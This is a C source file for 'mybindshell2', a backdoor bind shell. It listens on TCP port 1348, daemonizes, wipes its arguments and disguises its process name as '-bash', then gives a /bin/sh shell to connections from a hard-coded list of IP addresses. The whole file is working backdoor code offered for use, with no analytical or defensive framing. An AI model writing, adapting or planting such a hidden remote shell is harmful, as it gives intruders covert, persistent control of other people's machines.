/* mybindshell2.c copyrights by konewka <crackhead88@wp.pl>
* 
* another bindshell which spawns a shell to an allowded ip.
* edit defines and enter your ips.
* 
* http://www.olek.org/
*/
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>

#define PORT 1348
#define MAXCLIENTS 3
#define HIDE "-bash"
#define SHELL "/bin/sh"
#define CMD "uname -sr"

int allow(u_char *ip);
void go(u_int sd, u_char *src);

u_char* allowip[] = { "192.168.0.1", "217.97.31.90", "217.98.221.144", (void*)0 };
u_char motd[] = "Welcome to mybindshell2.\nHint: Put ';' before each command.\n";

int allow(u_char *ip) {
    u_int i;
    
    for (i=0;allowip[i] != NULL;i++) {
	if (!strcmp(ip, allowip[i]))
	    return 1;
    }
    return 0;
}

void go(u_int sd, u_char *src) {
    if (allow(src)) {
	write(sd, motd, strlen(motd));
	dup2(sd, 0); dup2(sd, 1); dup2(sd, 2); /* stderr, stdout, stdin .. */
	system(CMD);
	execl(SHELL, SHELL, (char *)0); /* spawn a shell */
	close(sd); 
	exit(0);
    }
    
    close(sd);
    exit(0); 
}

main(int argc, char *argv[]) {
    struct sockaddr_in home, remote;
    u_int sockIN, sockOUT, len, i;
    
    for (i=0;i<argc;i++)
	memset(argv[i], 0, strlen(argv[i]));
    strncpy(argv[0], HIDE, strlen(HIDE));

    memset((u_char *)&home, 0, sizeof(home));

    home.sin_family = AF_INET;
    home.sin_addr.s_addr = INADDR_ANY;
    home.sin_port = htons(PORT);

    if ((sockIN = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
    perror("socket()");
    return 1; }

    if (bind(sockIN, (struct sockaddr *)&home, sizeof(home))) {
    perror("bind()");
    return 1; }

    if (listen(sockIN, MAXCLIENTS)) {
    perror("listen()");
    return 1; }

    fprintf(stdout, "[*] allow ips:\n");
    for (i=0;allowip[i] != NULL;i++)
	printf("[%d] %s\n", i+1, allowip[i]);
    len = sizeof(home);

    if (fork())
	exit(0);
    
    while (1) {
	sockOUT = accept(sockIN, (struct sockaddr *)&remote, &len);
	if (fork() != 0) {
	    close(sockIN);
	    go(sockOUT, inet_ntoa(remote.sin_addr));
	}
	close(sockOUT);
    }

    close(sockIN);
    return 0;
}
